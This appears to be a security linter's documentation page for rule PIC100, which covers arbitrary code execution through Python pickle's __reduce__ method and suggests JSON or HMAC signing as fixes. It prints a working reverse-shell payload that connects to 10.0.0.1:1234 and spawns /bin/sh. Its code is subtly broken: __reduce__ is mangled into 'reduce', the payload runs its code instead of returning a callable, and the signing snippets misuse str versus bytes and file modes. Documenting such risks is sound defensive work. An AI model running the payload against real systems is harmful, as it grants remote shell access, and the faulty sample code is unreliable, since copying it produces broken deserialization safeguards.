<h1>PIC100</h1>
<p>Loading serialized data with the pickle module can expose arbitrary code execution using the <strong>reduce</strong> method.</p>
<p>Before objects are serialised, they can have a custom <code>__reduce__</code> method attribute, which will execute on expansion during the pickle loader.</p>
<p>This can be used to injection malicious data into serialized data.</p>
<p>Because pickle is often used for caching or storing python objects by serialization, attackers will use this flaw to write arbitrary code to execute on the host.</p>
<h2>Example</h2>
<p>```python import pickle</p>
<p>with open(f) as input:  python_objects = pickle.load(input)</p>
<p>```</p>
<p>An example attacker payload could be:</p>
<p>```python import pickle</p>
<p>class ReverseShell:  def <strong>reduce</strong>(self):  import socket,subprocess,os  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0)  os.dup2(s.fileno(),1)  os.dup2(s.fileno(),2)  p=subprocess.call(["/bin/sh","-i"])</p>
<p>payload = pickle.dumps(ReverseShell())</p>
<p>```</p>
<p>To start an open shell on 10.0.0.1:1234.</p>
<h2>Fixes</h2>
<p>Either:</p>
<ul>
  <li>Use an alternative deserialization method, like JSON</li>
  <li>Sign your serialized pickle data and then verify it before deserializing to ensure it hasn't been tampered with</li>
</ul>
<h2>Signing pickles</h2>
<p>To sign your pickled data, use the <code>hmac</code> module to hash the pickle data and insert it as a header.</p>
<p>```python import hashlib import hmac import pickle</p>
<p>data = pickle.dumps(obj) digest = hmac.new('unique-key-here', data, hashlib.blake2b).hexdigest() with open(f) as output:  output.write(str(digest) + ' ' + data)</p>
<p>```</p>
<p>To verify signed data, use something like this:</p>
<p>```python import hashlib import hmac import pickle import secrets</p>
<p>digest, pickle_data = data.split(' ') expected_digest = hmac.new('unique-key-here', pickle_data, hashlib.blake2b).hexdigest()</p>
<p>if not secrets.compare_digest(digest, expected_digest):  print('Invalid signature')  exit(1)</p>
<p>obj = pickle.loads(pickle_data) ```</p>
<h2>See Also</h2>
<ul>
  <li><a href="https://www.synopsys.com/blogs/software-security/python-pickling/">Understanding Python pickling and how to use it securely at synopsys.com</a></li>
</ul>